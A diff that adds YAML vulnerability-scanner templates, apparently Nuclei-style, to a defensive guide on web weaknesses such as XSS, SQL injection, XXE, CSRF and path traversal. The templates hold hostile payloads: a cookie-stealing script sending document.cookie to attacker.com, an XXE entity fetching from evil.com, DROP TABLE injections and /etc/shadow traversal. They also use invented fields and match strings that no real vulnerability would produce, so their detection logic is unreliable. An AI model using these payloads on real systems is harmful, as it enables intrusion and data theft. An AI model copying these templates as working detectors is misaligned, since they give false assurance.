@@ -51,6 +51,42 @@ By implementing these preventive measures and adopting a comprehensive approach 
 
 
 
+```
+id: exposure-sensitive-information
+info:
+  name: Exposure of Sensitive Information
+  author: Your Name
+  severity: medium
+  description: Detects potential exposure of sensitive information in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - sensitive-information
+requests:
+  - name: Exposed Secrets
+    path:
+      - /
+      - /admin
+    matchers:
+      - type: word
+        words:
+          - api_key
+          - password
+          - secret_key
+    attacks:
+      - type: word
+        words:
+          - error
+          - unauthorized
+      - type: word
+        words:
+          - access denied
+          - forbidden
+```
+
+
+
 
 ### Insertion of Sensitive Information Into Sent Data
 
@@ -77,6 +113,53 @@ To prevent the insertion of sensitive information into sent data, you can follow
 1. Employee training and awareness: Train your development team and system administrators about the importance of handling sensitive information securely. Educate them on best practices for data protection and the potential risks associated with the insertion of sensitive information into sent data.
 
 By implementing these preventive measures, you can reduce the risk of sensitive information being inadvertently included in sent data, protecting the confidentiality and privacy of your data and minimizing the potential impact of a security breach.
+
+
+
+```
+id: insertion-sensitive-information
+info:
+  name: Insertion of Sensitive Information Into Sent Data
+  author: Your Name
+  severity: high
+  description: Detects potential insertion of sensitive information into sent data in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - sensitive-information
+requests:
+  - name: Email Leakage
+    path:
+      - /
+      - /login
+    matchers:
+      - type: word
+        words:
+          - email
+    attacks:
+      - type: word
+        words:
+          - @example.com
+      - type: word
+        words:
+          - .com
+          - .net
+  - name: Credit Card Data Leakage
+    path:
+      - /checkout
+    matchers:
+      - type: regex
+        part: body
+        words:
+          - '[0-9]{16}'
+          - '[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}'
+    attacks:
+      - type: word
+        words:
+          - found
+          - exposed
+```
 
 
 
@@ -109,6 +192,44 @@ By implementing these preventive measures and maintaining a strong security post
 
 
 
+
+```
+id: csrf
+info:
+  name: Cross-Site Request Forgery (CSRF)
+  author: Your Name
+  severity: high
+  description: Detects potential Cross-Site Request Forgery vulnerabilities in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - csrf
+requests:
+  - name: CSRF Token Check
+    path:
+      - /
+      - /profile
+      - /admin
+    matchers:
+      - type: word
+        words:
+          - csrf_token
+          - authenticity_token
+    attacks:
+      - type: word
+        words:
+          - <form action="http://malicious-site.com/attack" method="POST">
+      - type: regex
+        part: body
+        words:
+          - '<input type="hidden" name="_token" value="[^"]+">'
+          - '<input type="hidden" name="csrf_token" value="[^"]+">'
+```
+
+
+
+
 ### Use of Hard-coded Password
 
 The use of hard-coded passwords refers to the practice of embedding passwords directly into source code or configuration files, making them easily discoverable by anyone with access to the code or files. This is considered a poor security practice as it can lead to unauthorized access and compromise of sensitive information.
@@ -135,6 +256,50 @@ To prevent the use of hard-coded passwords, you can follow these preventive meas
 
 By implementing these preventive measures, you can minimize the risk of hard-coded passwords and enhance the security of your application and sensitive data. It is crucial to follow secure coding practices, regularly review and update security controls, and stay informed about emerging best practices and vulnerabilities to maintain a strong security posture.
 
+
+```
+id: hard-coded-password
+info:
+  name: Use of Hard-coded Password
+  author: Your Name
+  severity: high
+  description: Detects the use of hard-coded passwords in source code or configuration files.
+  references:
+    - https://example.com
+tags:
+  - credentials
+requests:
+  - name: Hard-coded Password Check
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: word
+        words:
+          - password
+          - secret
+          - api_key
+    attacks:
+      - type: regex
+        part: body
+        words:
+          - 'password = ".*"'
+          - 'password: ".*"'
+          - 'password: .*'
+      - type: regex
+        part: body
+        words:
+          - 'secret = ".*"'
+          - 'secret: ".*"'
+          - 'secret: .*'
+      - type: regex
+        part: body
+        words:
+          - 'api_key = ".*"'
+          - 'api_key: ".*"'
+          - 'api_key: .*'
+```
 
 
 
@@ -166,6 +331,49 @@ By following these preventive measures and adopting strong cryptographic practic
 
 
 
+```
+id: broken-crypto-algorithm
+info:
+  name: Broken or Risky Crypto Algorithm
+  author: Your Name
+  severity: medium
+  description: Detects the use of broken or risky cryptographic algorithms in TLS configurations or code.
+  references:
+    - https://example.com
+tags:
+  - cryptography
+requests:
+  - name: Weak Crypto Algorithm Check
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: word
+        words:
+          - ssl_version
+          - cipher_suite
+          - crypto_algorithm
+    attacks:
+      - type: regex
+        part: body
+        words:
+          - 'ssl_version = ".*"'
+          - 'cipher_suite = ".*"'
+          - 'crypto_algorithm = ".*"'
+      - type: regex
+        part: body
+        words:
+          - 'ssl_version: ".*"'
+          - 'cipher_suite: ".*"'
+          - 'crypto_algorithm: ".*"'
+      - type: regex
+        part: body
+        words:
+          - 'algorithm = ".*"'
+          - 'algorithm: ".*"'
+```
+
 
 ### Risky Crypto Algorithm
 
@@ -195,6 +403,49 @@ Independent security reviews: Conduct independent security reviews or audits of 
 By following these preventive measures and adopting strong cryptographic practices, you can significantly reduce the risk of using broken or risky crypto algorithms and enhance the security of your application's sensitive data. It is essential to maintain an active stance in staying informed about cryptographic best practices and evolving security threats to ensure the continued security of your cryptographic implementations.
 
 
+```
+id: risky-crypto-algorithm
+info:
+  name: Risky Crypto Algorithm
+  author: Your Name
+  severity: medium
+  description: Detects the use of risky cryptographic algorithms in TLS configurations or code.
+  references:
+    - https://example.com
+tags:
+  - cryptography
+requests:
+  - name: Risky Crypto Algorithm Check
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: word
+        words:
+          - ssl_version
+          - cipher_suite
+          - crypto_algorithm
+    attacks:
+      - type: regex
+        part: body
+        words:
+          - 'ssl_version = ".*"'
+          - 'cipher_suite = ".*"'
+          - 'crypto_algorithm = "MD5|SHA1|RC4|DES"'
+      - type: regex
+        part: body
+        words:
+          - 'ssl_version: ".*"'
+          - 'cipher_suite: ".*"'
+          - 'crypto_algorithm: "MD5|SHA1|RC4|DES"'
+      - type: regex
+        part: body
+        words:
+          - 'algorithm = "MD5|SHA1|RC4|DES"'
+          - 'algorithm: "MD5|SHA1|RC4|DES"'
+```
+
 
 ### Insufficient Entropy
 
@@ -223,6 +474,45 @@ To prevent insufficient entropy, you can follow these preventive measures:
 
 By implementing these preventive measures, you can enhance the entropy generation process and ensure the strength and unpredictability of cryptographic operations. It is crucial to regularly assess and update your entropy generation mechanisms to adapt to evolving security requirements and best practices.
 
+
+```
+id: insufficient-entropy
+info:
+  name: Insufficient Entropy
+  author: Your Name
+  severity: medium
+  description: Detects the usage of weak or insufficient entropy sources in cryptographic operations.
+  references:
+    - https://example.com
+tags:
+  - cryptography
+requests:
+  - name: Insufficient Entropy Check
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: word
+        words:
+          - entropy
+    attacks:
+      - type: regex
+        part: body
+        words:
+          - 'entropy = [0-7]\.\d{1,}'
+          - 'entropy: [0-7]\.\d{1,}'
+      - type: regex
+        part: body
+        words:
+          - 'weak_entropy = true'
+          - 'weak_entropy: true'
+      - type: regex
+        part: body
+        words:
+          - 'insufficient_entropy = true'
+          - 'insufficient_entropy: true'
+```
 
 
 
@@ -255,6 +545,43 @@ To prevent XSS attacks, you can follow these preventive measures:
 
 By following these preventive measures, you can significantly reduce the risk of XSS attacks and protect your web application and users from potential malicious activities. It is essential to implement a layered approach to security, combining secure coding practices, input validation, output encoding, and regular security testing to maintain a strong defense against XSS vulnerabilities.
 
+
+```
+id: xss
+info:
+  name: Cross-Site Scripting (XSS)
+  author: Your Name
+  severity: high
+  description: Detects potential Cross-Site Scripting vulnerabilities in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - xss
+requests:
+  - name: XSS Payload Test
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: fuzz
+        payloads:
+          - '<script>alert("XSS");</script>'
+          - '<img src=x onerror=alert("XSS")>'
+          - '<svg/onload=alert("XSS")>'
+          - '<script>location.href="https://attacker.com/cookie.php?cookie="+document.cookie;</script>'
+      - type: regex
+        part: body
+        words:
+          - 'document\.cookie'
+          - 'eval\('
+          - 'on\w+=.*[\'"]'
+```
 
 
 
@@ -289,6 +616,42 @@ To prevent SQL Injection attacks, you can follow these preventive measures:
 By implementing these preventive measures, you can significantly reduce the risk of SQL Injection attacks and protect your web application from unauthorized database access or manipulation. It is important to adopt a proactive approach to security, combining secure coding practices, input validation, parameterized queries, and regular security testing to maintain the integrity and security of your application's database interactions.
 
 
+```
+id: sql-injection
+info:
+  name: SQL Injection
+  author: Your Name
+  severity: high
+  description: Detects potential SQL Injection vulnerabilities in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - sql-injection
+requests:
+  - name: SQL Injection Test
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: fuzz
+        payloads:
+          - "' OR 1=1 --"
+          - "'; DROP TABLE users; --"
+          - "'; SELECT * FROM users; --"
+      - type: regex
+        part: body
+        words:
+          - 'error in your SQL syntax'
+          - 'mysql_fetch_array()'
+          - 'sqlite_fetch_array()'
+```
+
 
 ### External Control of File Name or Path
 
@@ -317,6 +680,42 @@ To prevent External Control of File Name or Path vulnerabilities, you can follow
 1. Educate developers: Provide training and education to developers about secure file handling practices and the risks associated with external control of file name or path vulnerabilities. Promote secure coding techniques and best practices within your development team.
 
 By implementing these preventive measures, you can significantly reduce the risk of external control of file name or path vulnerabilities and protect your application from unauthorized file access or manipulation. It is crucial to follow secure coding practices, validate and sanitize file inputs, and regularly update your systems to address any emerging security issues.
+
+
+```
+id: file-path-injection
+info:
+  name: External Control of File Name or Path
+  author: Your Name
+  severity: medium
+  description: Detects potential file path injection vulnerabilities in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - file-path-injection
+requests:
+  - name: File Path Injection Test
+    path:
+      - /
+      - /download
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: GET
+            path: "/download?file={{.Fuzz}}"
+            headers:
+              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+            fuzz:
+              - "../../../../etc/passwd"
+              - "../../../../etc/shadow"
+              - "../../../../etc/hosts"
+```
+
 
 
 ### Generation of Error Message Containing Sensitive Information
@@ -348,6 +747,45 @@ To prevent the generation of error messages containing sensitive information, yo
 By implementing these preventive measures, you can minimize the risk of exposing sensitive information in error messages and enhance the security of your application. It is crucial to prioritize the protection of sensitive data and regularly review and update your error handling mechanisms to ensure they align with best practices and evolving security standards.
 
 
+```
+id: error-message-leak
+info:
+  name: Generation of Error Message Containing Sensitive Information
+  author: Your Name
+  severity: high
+  description: Detects potential leakage of sensitive information in error messages.
+  references:
+    - https://example.com
+tags:
+  - web
+  - error-message-leak
+requests:
+  - name: Error Message Leakage Test
+    path:
+      - /
+      - /login
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: POST
+            path: "/login"
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body:
+              username: "{{.Fuzz}}"
+              password: "password"
+            fuzz:
+              - "' OR '1'='1"
+              - "' OR 'a'='a"
+              - "' OR '1'='1' --"
+```
+
+
+
 ### Unprotected storage of credentials
 
 Unprotected storage of credentials refers to the practice of storing sensitive credentials, such as usernames, passwords, API keys, or access tokens, in an insecure manner. This can include storing credentials in plain text, using weak encryption, or storing them in easily accessible locations, making them vulnerable to unauthorized access and potential misuse by attackers.
@@ -377,6 +815,37 @@ To prevent unprotected storage of credentials, you should follow these preventiv
 By implementing these preventive measures, you can significantly reduce the risk of unprotected storage of credentials and enhance the security of your application and systems. Safeguarding sensitive credentials is crucial for protecting user data, preventing unauthorized access, and maintaining the trust of your users.
 
 
+```
+id: unprotected-credentials
+info:
+  name: Unprotected Storage of Credentials
+  author: Your Name
+  severity: high
+  description: Detects unprotected storage of sensitive credentials.
+  references:
+    - https://example.com
+tags:
+  - web
+  - unprotected-credentials
+requests:
+  - name: Unprotected Credential Storage Test
+    path:
+      - /
+      - /admin
+      - /login
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: GET
+            path: "/config"
+          - method: GET
+            path: "/credentials"
+```
+
 
 ### Trust Boundary Violation
 
@@ -405,6 +874,38 @@ To prevent Trust Boundary Violation, you should follow these preventive measures
 1. Provide security awareness training: Educate developers and system administrators about the risks and consequences of trust boundary violations. Promote security awareness and provide training on secure coding practices, secure configuration management, and the importance of enforcing trust boundaries.
 
 By following these preventive measures, you can mitigate the risk of trust boundary violations and enhance the overall security posture of your application or system. It is crucial to establish clear trust boundaries, implement appropriate security controls, and regularly monitor and update your systems to prevent unauthorized access or compromise across trust boundaries.
+
+
+```
+id: trust-boundary-violation
+info:
+  name: Trust Boundary Violation
+  author: Your Name
+  severity: medium
+  description: Detects trust boundary violations in the application.
+  references:
+    - https://example.com
+tags:
+  - web
+  - trust-boundary-violation
+requests:
+  - name: Trust Boundary Violation Test
+    path:
+      - /
+      - /admin
+      - /user
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: GET
+            path: "/user-details?admin=true"
+          - method: GET
+            path: "/admin-details?user=true"
+```
 
 
 ### Insufficiently Protected Credentials
@@ -438,6 +939,45 @@ To prevent Insufficiently Protected Credentials, you should follow these prevent
 By implementing these preventive measures, you can significantly reduce the risk of Insufficiently Protected Credentials and enhance the security of your systems. Protecting sensitive credentials is crucial for safeguarding user data, preventing unauthorized access, and maintaining the trust of your users.
 
 
+
+```
+id: insufficiently-protected-credentials
+info:
+  name: Insufficiently Protected Credentials
+  author: Your Name
+  severity: high
+  description: Detects instances where sensitive credentials are insufficiently protected.
+  references:
+    - https://example.com
+tags:
+  - web
+  - insufficiently-protected-credentials
+requests:
+  - name: Insufficiently Protected Credentials Test
+    path:
+      - /
+      - /admin
+      - /login
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: POST
+            path: /login
+            headers:
+              - name: Content-Type
+                value: application/x-www-form-urlencoded
+            body: "username=admin&password=admin"
+            matchers:
+              - type: word
+                words:
+                  - "Invalid username or password"
+```
+
+
 ### Restriction of XML External Entity Reference
 
 Restriction of XML External Entity (XXE) Reference is a security vulnerability that occurs when an XML parser processes external entities included in the XML input. Attackers can exploit this vulnerability to read sensitive data from the server or perform denial-of-service attacks.
@@ -465,6 +1005,47 @@ To prevent XXE vulnerabilities, you should follow these preventive measures:
 1. Perform security testing: Conduct security testing, including vulnerability assessments and penetration testing, to identify and remediate XXE vulnerabilities. Test the resilience of the application against various XXE attack vectors and verify the effectiveness of implemented security controls.
 
 By implementing these preventive measures, you can reduce the risk of XXE vulnerabilities and enhance the security of your XML processing. It is essential to be cautious when handling XML data, implement secure coding practices, and keep the XML parser up to date to prevent attackers from exploiting XXE vulnerabilities.
+
+
+```
+id: restriction-of-xxe-reference
+info:
+  name: Restriction of XML External Entity Reference
+  author: Your Name
+  severity: medium
+  description: Detects instances where XML parsing allows external entity references, potentially leading to XXE vulnerabilities.
+  references:
+    - https://example.com
+tags:
+  - web
+  - restriction-of-xxe-reference
+requests:
+  - name: Restriction of XXE Reference Test
+    path:
+      - /
+      - /admin
+      - /api
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: POST
+            path: /api/parse-xml
+            headers:
+              - name: Content-Type
+                value: application/xml
+            body: |
+              <?xml version="1.0" encoding="UTF-8"?>
+              <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
+              <root>&xxe;</root>
+            matchers:
+              - type: word
+                words:
+                  - "XXE detected"
+```
 
 
 ### Vulnerable and Outdated Components
@@ -496,6 +1077,43 @@ To prevent the use of vulnerable and outdated components, you should follow thes
 By following these preventive measures, you can reduce the risk of using vulnerable and outdated components in your application or system. Regularly updating components, staying informed about security updates, and conducting security assessments are essential to maintain a secure software ecosystem.
 
 
+```
+id: vulnerable-and-outdated-components
+info:
+  name: Vulnerable and Outdated Components
+  author: Your Name
+  severity: high
+  description: Detects vulnerable and outdated components in web applications.
+  references:
+    - https://example.com
+tags:
+  - web
+  - vulnerable-and-outdated-components
+requests:
+  - name: Vulnerable and Outdated Components Test
+    path:
+      - /
+      - /admin
+      - /dashboard
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: GET
+            path: /info
+            headers:
+              - name: User-Agent
+                value: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
+            matchers:
+              - type: word
+                words:
+                  - "Vulnerable component detected"
+```
+
+
 ### Improper Validation of Certificate with Host Mismatch
 
 Improper Validation of Certificate with Host Mismatch is a security vulnerability that occurs when a client application fails to properly validate the server's SSL/TLS certificate during a secure communication handshake. This vulnerability allows an attacker to impersonate the server by presenting a certificate that does not match the expected host.
@@ -524,6 +1142,41 @@ To prevent Improper Validation of Certificate with Host Mismatch, you should fol
 
 By following these preventive measures, you can mitigate the risk of Improper Validation of Certificate with Host Mismatch and ensure secure SSL/TLS connections in your client applications. Proper certificate validation is crucial for establishing trust and authenticity during secure communications.
 
+
+```
+id: improper-validation-of-certificate-with-host-mismatch
+info:
+  name: Improper Validation of Certificate with Host Mismatch
+  author: Your Name
+  severity: high
+  description: Detects improper validation of SSL/TLS certificates with host mismatches.
+  references:
+    - https://example.com
+tags:
+  - web
+  - ssl-tls
+  - certificate-validation
+requests:
+  - name: Certificate Host Mismatch Test
+    path:
+      - /
+      - /admin
+      - /dashboard
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        requests:
+          - method: GET
+            path: /
+            insecure: true
+            matchers:
+              - type: word
+                words:
+                  - "Certificate host mismatch detected"
+```
 
 ### Improper Authentication
 
@@ -554,6 +1207,47 @@ To prevent Improper Authentication, you should follow these preventive measures:
 By implementing these preventive measures, you can mitigate the risk of Improper Authentication and strengthen the security of user authentication in your application or system. Robust authentication practices are essential to protect user accounts, sensitive data, and ensure that only authorized individuals can access protected resources.
 
 
+```
+id: improper-authentication-with-host-mismatch
+info:
+  name: Improper Authentication with Host Mismatch
+  author: Your Name
+  severity: high
+  description: Detects improper authentication mechanisms that allow host mismatches.
+  references:
+    - https://example.com
+tags:
+  - web
+  - authentication
+  - host-mismatch
+requests:
+  - name: Host Mismatch Authentication Test
+    path:
+      - /
+      - /admin
+      - /dashboard
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        payloads:
+          - type: wordlist
+            words:
+              - admin:password
+              - user:password
+            separator: ":"
+        requests:
+          - method: POST
+            path: /login
+            insecure: true
+            matchers:
+              - type: word
+                words:
+                  - "Authentication failed: host mismatch detected"
+```
+
 ### Session Fixation
 
 Session Fixation is a security vulnerability that occurs when an attacker establishes or manipulates a user's session identifier (session ID) to gain unauthorized access to the user's session. The attacker tricks the user into using a known session ID, which the attacker can then use to hijack the session.
@@ -583,6 +1277,52 @@ To prevent Session Fixation, you should follow these preventive measures:
 By implementing these preventive measures, you can reduce the risk of Session Fixation and help ensure the integrity and security of user sessions. Secure session management practices are essential to protect user accounts and prevent unauthorized access to sensitive data and functionality.
 
 
+```
+id: session-fixation
+info:
+  name: Session Fixation
+  author: Your Name
+  severity: high
+  description: Detects vulnerabilities related to session fixation attacks.
+  references:
+    - https://example.com
+tags:
+  - web
+  - session-fixation
+requests:
+  - name: Session Fixation Test
+    path:
+      - /
+      - /login
+      - /admin
+    matchers:
+      - type: status
+        status:
+          - 200
+    attacks:
+      - type: dynamic-attack
+        payloads:
+          - type: wordlist
+            words:
+              - johndoe@example.com
+              - janedoe@example.com
+          - type: wordlist
+            words:
+              - 123456
+              - password123
+        requests:
+          - method: GET
+            path: /set-session-id
+          - method: POST
+            path: /login
+            insecure: true
+            matchers:
+              - type: word
+                words:
+                  - "Session ID mismatch detected"
+```
+
+
 ### Inclusion of Functionality from Untrusted Control
 
 Inclusion of Functionality from Untrusted Control, also known as Remote Code Execution (RCE), is a security vulnerability that occurs when an application incorporates and executes code from an untrusted or external source without proper validation or security measures. This vulnerability allows attackers to execute arbitrary code on the target system, potentially leading to unauthorized access, data breaches, or system compromise.
@@ -610,6 +1350,32 @@ To prevent the Inclusion of Functionality from Untrusted Control, you should fol
 1. Implement a Web Application Firewall (WAF): Consider using a WAF that can detect and block malicious code injection attempts. WAFs can provide an additional layer of protection by inspecting incoming requests and filtering out potentially dangerous code.
 
 By implementing these preventive measures, you can reduce the risk of Inclusion of Functionality from Untrusted Control and enhance the security of your application. Proper validation, access controls, and secure coding practices are essential to mitigate the risks associated with executing code from untrusted sources.
+
+```
+id: untrusted-control-inclusion
+info:
+  name: Inclusion of Functionality from Untrusted Control
+  author: Your Name
+  severity: medium
+  description: Detects vulnerabilities related to the inclusion of functionality from untrusted sources.
+  references:
+    - https://example.com
+tags:
+  - web
+  - untrusted-control
+requests:
+  - name: Inclusion of Untrusted File
+    path:
+      - /index.php?page=untrusted
+      - /admin.php?page=untrusted
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Untrusted Functionality Included"
+```
 
 
 ### Download of Code Without Integrity Check
@@ -642,6 +1408,33 @@ To prevent Download of Code Without Integrity Check, you should follow these pre
 By implementing these preventive measures, you can reduce the risk of Download of Code Without Integrity Check and ensure that the downloaded code or files are trustworthy and have not been tampered with. Verifying integrity, using secure sources, and implementing secure coding practices are critical for maintaining the integrity and security of downloaded code or files.
 
 
+```
+id: download-without-integrity-check
+info:
+  name: Download of Code Without Integrity Check
+  author: Your Name
+  severity: high
+  description: Detects vulnerabilities related to downloading code without integrity checks.
+  references:
+    - https://example.com
+tags:
+  - web
+  - download-code
+requests:
+  - name: Untrusted Code Download
+    path:
+      - /download.php?file=untrusted
+      - /file.php?name=untrusted
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Downloaded code without integrity check"
+```
+
+
 ### Deserialization of Untrusted Data
 
 Deserialization of Untrusted Data is a security vulnerability that occurs when untrusted or malicious data is deserialized by an application without proper validation and safeguards. Deserialization vulnerabilities can lead to various attacks, such as remote code execution, injection of malicious objects, or data tampering.
@@ -669,6 +1462,32 @@ To prevent Deserialization of Untrusted Data, you should follow these preventive
 1. Educate developers: Provide training and guidance to developers on secure coding practices, emphasizing the importance of proper validation and handling of deserialized data. Encourage developers to follow best practices for secure deserialization.
 
 By implementing these preventive measures, you can mitigate the risk of Deserialization of Untrusted Data and protect your application from potential attacks. Validating inputs, using secure libraries, implementing access controls, and maintaining up-to-date software are essential steps to prevent deserialization vulnerabilities.
+
+```
+id: deserialization-untrusted-data
+info:
+  name: Deserialization of Untrusted Data
+  author: Your Name
+  severity: high
+  description: Detects vulnerabilities related to the deserialization of untrusted data.
+  references:
+    - https://example.com
+tags:
+  - web
+  - deserialization
+requests:
+  - name: Untrusted Deserialization
+    path:
+      - /deserialize.php?data=untrusted
+      - /object.php?data=untrusted
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Untrusted deserialization detected"
+```
 
 
 ### Insufficient Logging
@@ -698,6 +1517,40 @@ To prevent Insufficient Logging, you should follow these preventive measures:
 1. Regularly review and update logging practices: Continuously review and update your logging practices based on evolving security requirements and industry best practices. Stay informed about emerging threats and logging-related vulnerabilities to ensure your logging mechanisms remain effective.
 
 By implementing these preventive measures, you can enhance your application's logging capabilities, facilitate incident detection and response, and improve your overall security posture. Comprehensive and secure logging practices play a vital role in detecting and investigating security incidents, aiding in timely incident response, and facilitating forensic analysis when necessary.
+
+
+```
+id: insufficient-logging
+info:
+  name: Insufficient Logging
+  author: Your Name
+  severity: medium
+  description: Detects vulnerabilities related to insufficient logging of security events.
+  references:
+    - https://example.com
+tags:
+  - web
+  - logging
+requests:
+  - name: Insufficient Logging
+    path:
+      - /login
+      - /admin
+      - /api/v1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Login failed"
+      - type: word
+        words:
+          - "Unauthorized access"
+      - type: word
+        words:
+          - "Access denied"
+```
 
 
 ### Improper Output Neutralization for Logs
@@ -730,6 +1583,39 @@ To prevent Improper Output Neutralization for Logs, you should follow these prev
 By implementing these preventive measures, you can mitigate the risk of Improper Output Neutralization for Logs and ensure that your log files remain reliable, accurate, and free from malicious content. Proper input validation, secure logging frameworks, context-specific output encoding, and regular log monitoring are essential steps to prevent log injection vulnerabilities.
 
 
+```
+id: improper-output-neutralization-logs
+info:
+  name: Improper Output Neutralization for Logs
+  author: Your Name
+  severity: medium
+  description: Detects vulnerabilities related to improper output neutralization in log messages.
+  references:
+    - https://example.com
+tags:
+  - web
+  - logging
+requests:
+  - name: Improper Output Neutralization for Logs
+    path:
+      - /login
+      - /admin
+      - /api/v1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{*}}"
+      - type: word
+        words:
+          - "<?php"
+      - type: word
+        words:
+          - "system("
+```
+
 
 ### Omission of Security-relevant Information
 
@@ -760,6 +1646,39 @@ To prevent the Omission of Security-relevant Information, you should follow thes
 By implementing these preventive measures, you can ensure that security-relevant information is properly logged and reported, enabling effective detection and response to security incidents. Comprehensive and accurate logging practices are essential for maintaining the security of your application and infrastructure, facilitating incident investigations, and supporting compliance requirements.
 
 
+```
+id: omission-security-relevant-info
+info:
+  name: Omission of Security-relevant Information
+  author: Your Name
+  severity: high
+  description: Detects vulnerabilities related to the omission of security-relevant information in error messages or responses.
+  references:
+    - https://example.com
+tags:
+  - web
+  - security
+requests:
+  - name: Omission of Security-relevant Information
+    path:
+      - /login
+      - /admin
+      - /api/v1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Unauthorized"
+      - type: word
+        words:
+          - "Forbidden"
+      - type: word
+        words:
+          - "Access denied"
+```
+
 ### Sensitive Information into Log File
 
 Sensitive Information into Log File refers to the unintentional logging or inclusion of sensitive data within log files. This can occur when application logs capture and store sensitive information such as passwords, credit card numbers, personally identifiable information (PII), or any other confidential data. Storing sensitive information in log files poses a significant security risk as it increases the potential for unauthorized access, data leakage, and compliance violations.
@@ -787,6 +1706,41 @@ To prevent the inclusion of sensitive information into log files, consider the f
 1. Train and educate personnel: Provide training and education to developers, system administrators, and other personnel involved in log file management. Raise awareness about the risks associated with logging sensitive information and promote best practices for secure logging.
 
 By implementing these preventive measures, you can reduce the risk of sensitive information being unintentionally logged and stored in log files. Taking proactive steps to protect the confidentiality and integrity of log data helps maintain compliance with data protection regulations, mitigates the risk of data breaches, and preserves the privacy of sensitive information.
+
+
+```
+id: sensitive-info-log-file
+info:
+  name: Sensitive Information into Log File
+  author: Your Name
+  severity: high
+  description: Detects vulnerabilities related to logging sensitive information into log files.
+  references:
+    - https://example.com
+tags:
+  - web
+  - security
+requests:
+  - name: Sensitive Information into Log File
+    path:
+      - /
+    matchers:
+      - type: status
+        status:
+          - 200
+    responses:
+      - type: word
+        words:
+          - "password"
+          - "credit card"
+          - "social security number"
+      - type: word
+        words:
+          - "private key"
+          - "API key"
+          - "access token"
+```
+
 
 
 ### Server-Side Request Forgery (SSRF)
@@ -818,6 +1772,36 @@ To prevent Server-Side Request Forgery (SSRF) vulnerabilities, consider the foll
 By implementing these preventive measures, you can significantly reduce the risk of SSRF vulnerabilities and protect your application from unauthorized access to internal resources and potential data breaches. It is important to adopt a security-first mindset throughout the application development lifecycle and regularly assess and enhance the security posture of your systems.
 
 
+```
+id: ssrf-detection
+info:
+  name: Server-Side Request Forgery (SSRF) Detection
+  author: Your Name
+  severity: high
+  description: Detects vulnerabilities related to Server-Side Request Forgery (SSRF) attacks.
+  references:
+    - https://example.com
+tags:
+  - web
+  - security
+requests:
+  - name: SSRF Detection
+    path:
+      - /
+    matchers:
+      - type: status
+        status:
+          - 200
+    match:
+      - type: word
+        words:
+          - "Internal Server Error"
+          - "Connection refused"
+          - "Invalid URL"
+      - type: regex
+        part: body
+        regex: '(https?|ftp)://[^/]+'
+```
 
 
 
